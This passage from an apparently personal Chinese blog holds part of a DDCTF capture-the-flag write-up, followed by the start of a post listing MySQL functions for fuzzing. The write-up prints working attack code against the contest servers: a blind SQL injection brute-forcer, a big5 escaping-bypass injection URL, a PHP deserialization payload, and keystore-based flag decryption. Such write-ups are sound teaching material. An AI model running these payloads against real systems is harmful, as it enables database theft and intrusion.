class="string">"error"</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err</span>) </span>&#123;</span><br><span class="line">                <span class="comment">//console.log(err, message);</span></span><br><span class="line">            &#125;)</span><br><span class="line">    </span><br><span class="line">            req.write(postData);</span><br><span class="line">            req.end();</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        ans=<span class="string">''</span>;</span><br><span class="line">        ll=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">1</span>;i&lt;<span class="number">128</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> j=<span class="number">1</span>;j&lt;<span class="number">128</span>;j++) &#123;</span><br><span class="line">                <span class="keyword">var</span> obj = &#123;</span><br><span class="line">                    id: <span class="string">''</span>,</span><br><span class="line">                    title: <span class="string">'ctf'</span>,</span><br><span class="line">                    author: <span class="string">"' and ascii(mid((select secvalue from ctf_key1),"</span> + i + <span class="string">",1))-"</span> + j + <span class="string">"#"</span>,</span><br><span class="line">                    date: <span class="string">''</span>,</span><br><span class="line">                    time: <span class="built_in">parseInt</span>(<span class="keyword">new</span> <span class="built_in">Date</span>().getTime() / <span class="number">1000</span>)</span><br><span class="line">                &#125;;</span><br><span class="line">                <span class="comment">//console.log(obj.author);</span></span><br><span class="line">                <span class="comment">//console.log(obj);</span></span><br><span class="line">                <span class="keyword">var</span> sign = signGenerate(obj, key);</span><br><span class="line">                <span class="keyword">var</span> options = &#123;</span><br><span class="line">                    hostname: <span class="string">'116.85.43.88'</span>,</span><br><span class="line">                    method: <span class="string">'POST'</span>,</span><br><span class="line">                    port: <span class="number">8080</span>,</span><br><span class="line">                    path: <span class="string">'/PEQFGTUTQMZWCZGK/dfe3ia/index.php?'</span> + querystring.stringify(&#123;<span class="string">'sig'</span>: sign, <span class="string">'time'</span>: obj.time&#125;),</span><br><span class="line">                    headers: &#123;</span><br><span class="line">                        <span class="string">'X-Forwarded-For'</span>: <span class="string">'123.232.23.245'</span>,</span><br><span class="line">                        <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">var</span> data = <span class="keyword">await</span> request(options, querystring.stringify(obj));</span><br><span class="line">                <span class="comment">//console.log(data);break;</span></span><br><span class="line">                <span class="keyword">var</span> $ = cheerio.load(data);</span><br><span class="line">                <span class="keyword">if</span>($(<span class="string">'tr'</span>).length==<span class="number">0</span>)<span class="built_in">console</span>.log(data);</span><br><span class="line">                <span class="comment">//console.log($('tr').length);</span></span><br><span class="line">                <span class="keyword">if</span> ($(<span class="string">'tr'</span>).length == <span class="number">3</span>)&#123; ans = ans + <span class="built_in">String</span>.fromCharCode(j);<span class="keyword">break</span>&#125;</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'[+]'</span>+ans);</span><br><span class="line">            <span class="keyword">if</span>(j==<span class="number">128</span>)<span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    main();</span><br><span class="line"><span class="string">``</span><span class="string">`   </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">其中math.js即为网页中的math.js,最后一行添加：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">`</span><span class="string">``</span>js</span><br><span class="line">    <span class="built_in">module</span>.exports=hex_math_enc;</span><br></pre></td></tr></table></figure>
<p><img src="http://p7lc13qga.bkt.clouddn.com/web1.png" alt="web1"></p>
<h2 id="专属链接"><a href="#专属链接" class="headerlink" title="专属链接"></a>专属链接</h2><p>文件包含漏洞，而且通过报错界面可获得类名称，因此可以获得.class文件，这里贴一下获得的一些比较重要的源码:</p>
<p> InitListener.java</p>
<pre><code class="java">
<span class="comment">// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.</span>
<span class="comment">// Jad home page: http://www.geocities.com/kpdus/jad.html</span>
<span class="comment">// Decompiler options: packimports(3) </span>
<span class="comment">// Source File Name:   InitListener.java</span>

<span class="keyword">package</span> com.didichuxing.ctf.listener;

<span class="keyword">import</span> com.didichuxing.ctf.model.Flag;
<span class="keyword">import</span> com.didichuxing.ctf.service.FlagService;
<span class="keyword">import</span> java.io.*;
<span class="keyword">import</span> java.security.*;
<span class="keyword">import</span> java.security.cert.CertificateException;
<span class="keyword">import</span> java.util.Properties;
<span class="keyword">import</span> java.util.UUID;
<span class="keyword">import</span> javax.crypto.*;
<span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;
<span class="keyword">import</span> javax.servlet.ServletContext;
<span class="keyword">import</span> org.apache.commons.io.FileUtils;
<span class="keyword">import</span> org.springframework.beans.factory.InitializingBean;
<span class="keyword">import</span> org.springframework.context.*;
<span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;

<span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InitListener</span></span>
<span class="class">    <span class="keyword">implements</span> <span class="title">ApplicationListener</span>, <span class="title">InitializingBean</span></span>
<span class="class"></span>{

    <span class="function"><span class="keyword">public</span> <span class="title">InitListener</span><span class="params">()</span></span>
<span class="function">    </span>{
        properties = <span class="keyword">new</span> Properties();
    }

    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterPropertiesSet</span><span class="params">()</span></span>
<span class="function">        <span class="keyword">throws</span> Exception</span>
<span class="function">    </span>{
        System.out.println(<span class="string">"afterPropertiesSet"</span>);
        <span class="keyword">try</span>
        {
            java.io.InputStream inputStream = getClass().getClassLoader().getResourceAsStream(<span class="string">"/properties/conf.properties"</span>);
            properties.load(inputStream);
        }
        <span class="keyword">catch</span>(Exception e)
        {
            e.printStackTrace();
        }
        p = <span class="string">"sdl welcome you !"</span>.substring(<span class="number">0</span>, <span class="string">"sdl welcome you !"</span>.length() - <span class="number">1</span>).trim().replace(<span class="string">" "</span>, <span class="string">""</span>);
    }

    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onApplicationEvent</span><span class="params">(ApplicationEvent event)</span></span>
<span class="function">    </span>{
        <span class="keyword">if</span>(!(event.getSource() <span class="keyword">instanceof</span> ApplicationContext))
            <span class="keyword">return</span>;
        WebApplicationContext ctx = (WebApplicationContext)event.getSource();
        <span class="keyword">if</span>(ctx.getParent() != <span class="keyword">null</span>)
            <span class="keyword">return</span>;
        String regenflag = properties.getProperty(<span class="string">"regenflag"</span>);
        <span class="keyword">if</span>(regenflag != <span class="keyword">null</span> &amp;&amp; <span class="string">"false"</span>.equals(regenflag))
        {
            System.out.println(<span class="string">"skip gen flag"</span>);
            <span class="keyword">return</span>;
        }
        <span class="keyword">try</span>
        {
            flagService.deleteAll();
            <span class="keyword">int</span> id = <span class="number">1</span>;
            String path = ctx.getServletContext().getRealPath(<span class="string">"/WEB-INF/classes/emails.txt"</span>);
            String ksPath = ctx.getServletContext().getRealPath(<span class="string">"/WEB-INF/classes/sdl.ks"</span>);
            System.out.println(path);
            String emailsString = FileUtils.readFileToString(<span class="keyword">new</span> File(path), <span class="string">"utf-8"</span>);
            String emails[] = emailsString.trim().split(<span class="string">"\n"</span>);
            KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());
            FileInputStream inputStream = <span class="keyword">new</span> FileInputStream(ksPath);
            keyStore.load(inputStream, p.toCharArray());
            Key key = keyStore.getKey(<span class="string">"www.didichuxing.com"</span>, p.toCharArray());
            Cipher cipher = Cipher.getInstance(key.getAlgorithm());
            cipher.init(<span class="number">1</span>, key);
            SecretKeySpec signingKey = <span class="keyword">new</span> SecretKeySpec(<span class="string">"sdl welcome you !"</span>.getBytes(), <span class="string">"HmacSHA256"</span>);
            Mac mac = Mac.getInstance(<span class="string">"HmacSHA256"</span>);
            mac.init(signingKey);
            SecureRandom sr = <span class="keyword">new</span> SecureRandom();
            String as[] = emails;
            <span class="keyword">int</span> i = as.length;
            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; j++)
            {
                String email = as[j];
                String flag = (<span class="keyword">new</span> StringBuilder()).append(<span class="string">"DDCTF{"</span>).append(Math.abs(sr.nextLong())).append(<span class="string">"}"</span>).toString();
                String uuid = UUID.randomUUID().toString().replace(<span class="string">"-"</span>, <span class="string">"s"</span>);
                <span class="keyword">byte</span> data[] = cipher.doFinal(flag.getBytes());
                <span class="keyword">byte</span> e[] = mac.doFinal(String.valueOf(email.trim()).getBytes());
                Flag flago = <span class="keyword">new</span> Flag();
                flago.setId(Integer.valueOf(id));
                flago.setFlag(byte2hex(data));
                flago.setEmail(byte2hex(e));
                flago.setOriginFlag(flag);
                flago.setUuid(uuid);
                flago.setOriginEmail(email);
                flagService.save(flago);
                System.out.println((<span class="keyword">new</span> StringBuilder()).append(email).append(<span class="string">"\u540C\u5B66\u7684\u5165\u53E3\u94FE\u63A5\u4E3A\uFF1Ahttp://116.85.48.102:5050/welcom/"</span>).append(uuid).toString());
                id++;
                System.out.println(flago);
            }

        }
        <span class="keyword">catch</span>(KeyStoreException e)
        {
            e.printStackTrace();
        }
        <span class="keyword">catch</span>(IOException e)
        {
            e.printStackTrace();
        }
        <span class="keyword">catch</span>(NoSuchAlgorithmException e)
        {
            e.printStackTrace();
        }
        <span class="keyword">catch</span>(CertificateException e)
        {
            e.printStackTrace();
        }
        <span class="keyword">catch</span>(UnrecoverableKeyException e)
        {
            e.printStackTrace();
        }
        <span class="keyword">catch</span>(NoSuchPaddingException e)
        {
            e.printStackTrace();
        }
        <span class="keyword">catch</span>(InvalidKeyException e)
        {
            e.printStackTrace();
        }
        <span class="keyword">catch</span>(IllegalBlockSizeException e)
        {
            e.printStackTrace();
        }
        <span class="keyword">catch</span>(BadPaddingException e)
        {
            e.printStackTrace();
        }
    }

    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">byte2hex</span><span class="params">(<span class="keyword">byte</span> b[])</span></span>
<span class="function">    </span>{
        StringBuilder hs = <span class="keyword">new</span> StringBuilder();
        <span class="keyword">for</span>(<span class="keyword">int</span> n = <span class="number">0</span>; b != <span class="keyword">null</span> &amp;&amp; n &lt; b.length; n++)
        {
            String stmp = Integer.toHexString(b[n] &amp; <span class="number">0xff</span>);
            <span class="keyword">if</span>(stmp.length() == <span class="number">1</span>)
                hs.append(<span class="string">'0'</span>);
            hs.append(stmp);
        }

        <span class="keyword">return</span> hs.toString().toUpperCase();
    }

    <span class="keyword">final</span> String k = <span class="string">"sdl welcome you !"</span>;
    <span class="keyword">private</span> FlagService flagService;
    <span class="keyword">private</span> Properties properties;
    <span class="keyword">private</span> String p;
}

</code></pre>
<p>FlagController.java</p>
<pre><code class="java">
<span class="keyword">package</span> com.didichuxing.ctf.controller.user;

<span class="keyword">import</span> com.didichuxing.ctf.model.Flag;
<span class="keyword">import</span> com.didichuxing.ctf.service.FlagService;
<span class="keyword">import</span> java.io.PrintStream;
<span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="keyword">import</span> org.springframework.ui.ModelMap;
<span class="keyword">import</span> org.springframework.web.bind.annotation.PathVariable;
<span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;
<span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;


<span class="meta">@RestController</span>
<span class="meta">@RequestMapping</span>({<span class="string">"flag"</span>})
<span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FlagController</span></span>
<span class="class"></span>{
  <span class="meta">@Autowired</span>
  <span class="keyword">private</span> FlagService flagService;

  <span class="function"><span class="keyword">public</span> <span class="title">FlagController</span><span class="params">()</span> </span>{}

  <span class="meta">@RequestMapping</span>(value={<span class="string">"/getflag/{email:[0-9a-zA-Z']+}"</span>}, method={org.springframework.web.bind.annotation.RequestMethod.POST})
  <span class="function"><span class="keyword">public</span> String <span class="title">getFlag</span><span class="params">(@PathVariable(<span class="string">"email"</span>)</span> String email, ModelMap model)</span>
<span class="function">  </span>{
    Flag flag = flagService.getFlagByEmail(email);


    <span class="keyword">return</span> <span class="string">"Encrypted flag : "</span> + flag.getFlag();
  }


  <span class="meta">@RequestMapping</span>({<span class="string">"/testflag/{flag}"</span>})
  <span class="function"><span class="keyword">public</span> String <span class="title">submitFlag</span><span class="params">(@PathVariable(<span class="string">"flag"</span>)</span> String flag, ModelMap model)</span>
<span class="function">  </span>{
    String[] fs = flag.split(<span class="string">"[{}]"</span>);
    Long longFlag = Long.valueOf(fs[<span class="number">1</span>]);

    <span class="keyword">int</span> i = flagService.exist(flag);


    <span class="keyword">if</span> (i &gt; <span class="number">0</span>) {
      <span class="keyword">return</span> <span class="string">"pass!!!"</span>;
    }
    <span class="keyword">return</span> <span class="string">"failed!!!"</span>;
  }


  <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>
<span class="function">  </span>{
    System.out.println(<span class="string">"test"</span>);
  }
}
</code></pre>
<p>可以看到在数据库中保存了SHA256后的email和RSA加密后的flag，而FlagController提供了利用加密后的email获取加密后的flag的接口。猜测这里的email为主页上联系方式处的email:<a href="mailto:**8071103253958342134@didichuxing.com">**8071103253958342134@didichuxing.com</a>**。将email加密后获取到flag，使用以下java代码来解密:</p>
<pre><code class="java"><span class="keyword">package</span> com.company;

<span class="keyword">import</span> javax.crypto.Cipher;
<span class="keyword">import</span> java.io.File;
<span class="keyword">import</span> java.io.FileInputStream;
<span class="keyword">import</span> java.io.FileNotFoundException;
<span class="keyword">import</span> java.io.IOException;
<span class="keyword">import</span> java.security.*;
<span class="keyword">import</span> java.security.cert.Certificate;

<span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>{

    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>{
    <span class="comment">// write your code here</span>
        <span class="keyword">try</span> {
            FileInputStream str = <span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(<span class="string">"/tmp/xxx.xx"</span>));
            String p = <span class="string">"sdl welcome you !"</span>.substring(<span class="number">0</span>, <span class="string">"sdl welcome you !"</span>.length() - <span class="number">1</span>).trim().replace(<span class="string">" "</span>, <span class="string">""</span>);
            KeyStore keystore=KeyStore.getInstance(KeyStore.getDefaultType());
            FileInputStream input=<span class="keyword">new</span> FileInputStream(<span class="string">"/tmp/sdl.ks"</span>);
            keystore.load(input,p.toCharArray());
            Key key=keystore.getKey(<span class="string">"www.didichuxing.com"</span>, p.toCharArray());
            Certificate cert=keystore.getCertificate(<span class="string">"www.didichuxing.com"</span>);
            PublicKey publicKey=cert.getPublicKey();

            Cipher cipher=Cipher.getInstance(key.getAlgorithm());
            System.out.println(Cipher.DECRYPT_MODE);
            System.out.println(Cipher.ENCRYPT_MODE);
            cipher.init(Cipher.DECRYPT_MODE,publicKey);
            <span class="keyword">byte</span> m[]=str.readAllBytes();
            System.out.println(m);
            <span class="keyword">byte</span> data[]=cipher.doFinal(m);
            System.out.println(<span class="keyword">new</span> String(data));

        }
        <span class="keyword">catch</span>(Exception e){
            e.printStackTrace();
        }

    }
}


</code></pre>
<p>其中 /tmp/sdl.ks是通过文件包含漏洞读取到的ketstore文件，包含公钥与私钥信息，/tmp/xxx.xx保存加密后的flag. 解密后获得flag. <img src="http://p7lc13qga.bkt.clouddn.com/web2.png" alt="web2"></p>
<h2 id="注入的奥妙"><a href="#注入的奥妙" class="headerlink" title="注入的奥妙"></a>注入的奥妙</h2><p>首先是sql注入，页面提示后端数据库的编码是big5编码，因此从big5编码表中找到5c结尾的汉字即可绕过add_slashes;其中关键字过滤可以用双写来绕过，最终的获取route_rules表的内容的payload为:</p>
<pre><code>http://116.85.48.105:5033/5d71b644-ee63-4b11-9c13-da3c4ac35b8d/well/getmessage/1%E5%85%9D&apos;%20and%200%20uniounionn%20select%20pattern,action,rulepass%20%20from%20route_rules%23
</code></pre><blockquote>
<p>中间暴库时需要转换编码 convert(xxx using big5)</p>
</blockquote>
<p>获取到路由规则表的内容:</p>
<table>
<thead>
<tr>
<th></th>
<th style="text-align:center">action</th>
<th style="text-align:right">pattern</th>
<th>type</th>
</tr>
</thead>
<tbody>
<tr>
<td>get*/</td>
<td style="text-align:center">u/well/getmessage/</td>
<td style="text-align:right">s</td>
</tr>
<tr>
<td>get*/</td>
<td style="text-align:center">u/justtry/self/</td>
<td style="text-align:right">s</td>
</tr>
<tr>
<td>post*/</td>
<td style="text-align:center">u/justtry/try</td>
<td style="text-align:right">JustTry#try</td>
</tr>
<tr>
<td>static/bootstrap/css/backup.css</td>
<td style="text-align:center">static/bootstrap/css/backup.zip</td>
<td style="text-align:right"></td>
</tr>
</tbody>
</table>
<p>访问static/boostrap/css/backup.css,可获取网页的所有源码，可以看到justtry/try处为反序列化，可以利用这里的反序列化反序列化test类即可获取flag. 生成反序列化脚本的payload为:</p>
<pre><code class="php">
<span class="meta">&lt;?php</span>
<span class="keyword">namespace</span> <span class="title">Index</span>\<span class="title">Helper</span>;
<span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>{
    <span class="keyword">public</span> $sql;
}
<span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>{
    <span class="keyword">public</span> $user_uuid;
    <span class="keyword">public</span> $fl;
}
<span class="class"><span class="keyword">class</span> <span class="title">SQL</span></span>{
    <span class="keyword">public</span> $dbc;
    <span class="keyword">public</span> $pdo;
}
$fl=<span class="keyword">new</span> Flag;
$fl-&gt;sql=<span class="keyword">new</span> SQL;
$test=<span class="keyword">new</span> Test;
$test-&gt;user_uuid=<span class="string">"c38639ed-2d7f-41bd-a412-4c489de8102e"</span>;
$test-&gt;fl=$fl;
print_r(serialize($test));

</code></pre>
<p><img src="http://p7lc13qga.bkt.clouddn.com/web3.PNG" alt="web3"></p>
<h2 id="mini-blockchain"><a href="#mini-blockchain" class="headerlink" title="mini-blockchain"></a>mini-blockchain</h2><p>解题思路:利用create_transaction在头区块后生成一条更长的链覆盖原来的链从而覆盖给黑客的交易记录，然后再利用backdoor给超市转10000，获得一个diamound;然后再将现在这条链覆盖，再利用backdoor给超市转10000，又可以获得一个flag. 添加新区块需要满足新区块的hash少于DIFFICULTY，这里使用所有数字组合来爆破。插入的区块中transaction数组为空，意味着不包含任何交易记录，这样既可避免获取私钥。 爆破新区块的脚本为:</p>
<pre><code class="python">
<span class="function"><span class="keyword">def</span> <span class="title">deal</span><span class="params">(head)</span>:</span>
        <span class="keyword">global</span> session
        <span class="keyword">print</span> session
        DIFFICULTY = int(<span class="string">'00000'</span> + <span class="string">'f'</span> * <span class="number">59</span>, <span class="number">16</span>)
        <span class="keyword">print</span> DIFFICULTY
        i=<span class="number">0</span>
        <span class="keyword">while</span> <span class="keyword">True</span>:
            transferred = create_tx([], [])
            <span class="comment">#print head </span>
            new_block = create_block(str(head), str(i), [])
            <span class="comment">#print new_block</span>
            <span class="keyword">if</span> int(new_block[<span class="string">'hash'</span>],<span class="number">16</span>)&lt;DIFFICULTY:
                <span class="keyword">print</span> json.dumps(new_block)
            i=i+<span class="number">1</span>
            <span class="comment">#print new_block</span>
            <span class="comment">#print "hash",int(new_block['hash'],16)</span>

deal(sys.argv[<span class="number">1</span>])

</code></pre>
<p>每次运行将想要插入的位置的hash作为参数,即可生成一个没有交易的空区块，当新生成的链长度大于原有链长度即可覆盖原有的链。</p>

          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/mysql-functions/index.html">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Imagemlt">
      <meta itemprop="description" content="personal blog">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Image's blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/post/mysql-functions/index.html" itemprop="url">
                  mysql中的所有函数汇总（Fuzz用）
                </a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2018-04-15 22:04:35" itemprop="dateCreated datePublished" datetime="2018-04-15T22:04:35+08:00">2018-04-15</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-07-06 23:27:08" itemprop="dateModified" datetime="2019-07-06T23:27:08+08:00">2019-07-06</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/人生杂谈/" itemprop="url" rel="index"><span itemprop="name">人生杂谈</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <pre><code>[u&apos;ABS()&apos;, u&apos;ACOS()&apos;, u&apos;ADDDATE()&apos;, u&apos;ADDTIME()&apos;, u&apos;AES_DECRYPT()&apos;, u&apos;AES_ENCRYPT()&apos;, u&apos;AND, &amp;&amp;&apos;, u&apos;Area()&apos;, u&apos;AsBinary(), AsWKB()&apos;, u&apos;ASCII()&apos;, u&apos;ASIN()&apos;, u&apos;=&apos;, u&apos;:=&apos;, u&apos;AsText(), AsWKT()&apos;, u&apos;ATAN()&apos;, u&apos;ATAN2(), ATAN()&apos;, u&apos;AVG()&apos;, u&apos;BENCHMARK()&apos;, u&apos;BETWEEN ... AND ...&apos;, u&apos;BIN()&apos;, u&apos;BINARY&apos;, u&apos;BIT_AND()&apos;, u&apos;BIT_COUNT()&apos;, u&apos;BIT_LENGTH()&apos;, u&apos;BIT_OR()&apos;, u&apos;BIT_XOR()&apos;, u&apos;&amp;&apos;, u&apos;~&apos;, u&apos;|&apos;, u&apos;^&apos;, u&apos;CASE&apos;, u&apos;CAST()&apos;, u&apos;CEIL()&apos;, u&apos;CEILING()&apos;, u&apos;Centroid()&apos;, u&apos;CHAR()&apos;, u&apos;CHAR_LENGTH()&apos;, u&apos;CHARACTER_LENGTH()&apos;, u&apos;CHARSET()&apos;, u&apos;COALESCE()&apos;, u&apos;COERCIBILITY()&apos;, u&apos;COLLATION()&apos;, u&apos;COMPRESS()&apos;, u&apos;CONCAT()&apos;, u&apos;CONCAT_WS()&apos;, u&apos;CONNECTION_ID()&apos;, u&apos;Contains()&apos;, u&apos;CONV()&apos;, u&apos;CONVERT()&apos;, u&apos;CONVERT_TZ()&apos;, u&apos;COS()&apos;, u&apos;COT()&apos;, u&apos;COUNT()&apos;, u&apos;COUNT(DISTINCT)&apos;, u&apos;CRC32()&apos;, u&apos;Crosses()&apos;, u&apos;CURDATE()&apos;, u&apos;CURRENT_DATE(), CURRENT_DATE&apos;, u&apos;CURRENT_TIME(), CURRENT_TIME&apos;, u&apos;CURRENT_TIMESTAMP(), CURRENT_TIMESTAMP&apos;, u&apos;CURRENT_USER(), CURRENT_USER&apos;, u&apos;CURTIME()&apos;, u&apos;DATABASE()&apos;, u&apos;DATE()&apos;, u&apos;DATE_ADD()&apos;, u&apos;DATE_FORMAT()&apos;, u&apos;DATE_SUB()&apos;, u&apos;DATEDIFF()&apos;, u&apos;DAY()&apos;, u&apos;DAYNAME()&apos;, u&apos;DAYOFMONTH()&apos;, u&apos;DAYOFWEEK()&apos;, u&apos;DAYOFYEAR()&apos;, u&apos;DECODE()&apos;, u&apos;DEFAULT()&apos;, u&apos;DEGREES()&apos;, u&apos;DES_DECRYPT()&apos;, u&apos;DES_ENCRYPT()&apos;, u&apos;Dimension()&apos;, u&apos;Disjoint()&apos;, u&apos;DIV&apos;, u&apos;/&apos;, u&apos;ELT()&apos;, u&apos;ENCODE()&apos;, u&apos;ENCRYPT()&apos;, u&apos;EndPoint()&apos;, u&apos;Envelope()&apos;, u&apos;=&apos;, u&apos;&lt;=&gt;&apos;, u&apos;Equals()&apos;, u&apos;EXP()&apos;, u&apos;EXPORT_SET()&apos;, u&apos;ExteriorRing()&apos;, u&apos;EXTRACT()&apos;, u&apos;ExtractValue()&apos;, u&apos;FIELD()&apos;, u&apos;FIND_IN_SET()&apos;, u&apos;FLOOR()&apos;, u&apos;FORMAT()&apos;, u&apos;FOUND_ROWS()&apos;, u&apos;FROM_DAYS()&apos;, u&apos;FROM_UNIXTIME()&apos;, u&apos;GeomCollFromText(), GeometryCollectionFromText()&apos;, u&apos;GeomCollFromWKB(), GeometryCollectionFromWKB()&apos;, u&apos;GeometryCollection()&apos;, u&apos;GeometryN()&apos;, u&apos;GeometryType()&apos;, u&apos;GeomFromText(), GeometryFromText()&apos;, u&apos;GeomFromWKB(), GeometryFromWKB()&apos;, u&apos;GET_FORMAT()&apos;, u&apos;GET_LOCK()&apos;, u&apos;GLength()&apos;, u&apos;&gt;&apos;, u&apos;&gt;=&apos;, u&apos;GREATEST()&apos;, u&apos;GROUP_CONCAT()&apos;, u&apos;HEX()&apos;, u&apos;HOUR()&apos;, u&apos;IF()&apos;, u&apos;IFNULL()&apos;, u&apos;IN()&apos;, u&apos;INET_ATON()&apos;, u&apos;INET_NTOA()&apos;, u&apos;INSERT()&apos;, u&apos;INSTR()&apos;, u&apos;InteriorRingN()&apos;, u&apos;Intersects()&apos;, u&apos;INTERVAL()&apos;, u&apos;IS&apos;, u&apos;IS_FREE_LOCK()&apos;, u&apos;IS NOT&apos;, u&apos;IS NOT NULL&apos;, u&apos;IS NULL&apos;, u&apos;IS_USED_LOCK()&apos;, u&apos;IsClosed()&apos;, u&apos;IsEmpty()&apos;, u&apos;ISNULL()&apos;, u&apos;IsSimple()&apos;, u&apos;LAST_DAY&apos;, u&apos;LAST_INSERT_ID()&apos;, u&apos;LCASE()&apos;, u&apos;LEAST()&apos;, u&apos;LEFT()&apos;, u&apos;&lt;&lt;&apos;, u&apos;LENGTH()&apos;, u&apos;&lt;&apos;, u&apos;&lt;=&apos;, u&apos;LIKE&apos;, u&apos;LineFromText(), LineStringFromText()&apos;, u&apos;LineFromWKB(), LineStringFromWKB()&apos;, u&apos;LineString()&apos;, u&apos;LN()&apos;, u&apos;LOAD_FILE()&apos;, u&apos;LOCALTIME(), LOCALTIME&apos;, u&apos;LOCALTIMESTAMP, LOCALTIMESTAMP()&apos;, u&apos;LOCATE()&apos;, u&apos;LOG()&apos;, u&apos;LOG10()&apos;, u&apos;LOG2()&apos;, u&apos;LOWER()&apos;, u&apos;LPAD()&apos;, u&apos;LTRIM()&apos;, u&apos;MAKE_SET()&apos;, u&apos;MAKEDATE()&apos;, u&apos;MAKETIME()&apos;, u&apos;MASTER_POS_WAIT()&apos;, u&apos;MATCH&apos;, u&apos;MAX()&apos;, u&apos;MBRContains()&apos;, u&apos;MBRDisjoint()&apos;, u&apos;MBREqual()&apos;, u&apos;MBRIntersects()&apos;, u&apos;MBROverlaps()&apos;, u&apos;MBRTouches()&apos;, u&apos;MBRWithin()&apos;, u&apos;MD5()&apos;, u&apos;MICROSECOND()&apos;, u&apos;MID()&apos;, u&apos;MIN()&apos;, u&apos;-&apos;, u&apos;MINUTE()&apos;, u&apos;MLineFromText(), MultiLineStringFromText()&apos;, u&apos;MLineFromWKB(), MultiLineStringFromWKB()&apos;, u&apos;MOD()&apos;, u&apos;%, MOD&apos;, u&apos;MONTH()&apos;, u&apos;MONTHNAME()&apos;, u&apos;MPointFromText(), MultiPointFromText()&apos;, u&apos;MPointFromWKB(), MultiPointFromWKB()&apos;, u&apos;MPolyFromText(), MultiPolygonFromText()&apos;, u&apos;MPolyFromWKB(), MultiPolygonFromWKB()&apos;, u&apos;MultiLineString()&apos;, u&apos;MultiPoint()&apos;, u&apos;MultiPolygon()&apos;, u&apos;NAME_CONST()&apos;, u&apos;NOT, !&apos;, u&apos;NOT BETWEEN ... AND ...&apos;, u&apos;!=, &lt;&gt;&apos;, u&apos;NOT IN()&apos;, u&apos;NOT LIKE&apos;, u&apos;NOT REGEXP&apos;, u&apos;NOW()&apos;, u&apos;NULLIF()&apos;, u&apos;NumGeometries()&apos;, u&apos;NumInteriorRings()&apos;, u&apos;NumPoints()&apos;, u&apos;OCT()&apos;, u&apos;OCTET_LENGTH()&apos;, u&apos;OLD_PASSWORD()&apos;, u&apos;||, OR&apos;, u&apos;ORD()&apos;, u&apos;Overlaps()&apos;, u&apos;PASSWORD()&apos;, u&apos;PERIOD_ADD()&apos;, u&apos;PERIOD_DIFF()&apos;, u&apos;PI()&apos;, u&apos;+&apos;, u&apos;Point()&apos;, u&apos;PointFromText()&apos;, u&apos;PointFromWKB()&apos;, u&apos;PointN()&apos;, u&apos;PolyFromText(), PolygonFromText()&apos;, u&apos;PolyFromWKB(), PolygonFromWKB()&apos;, 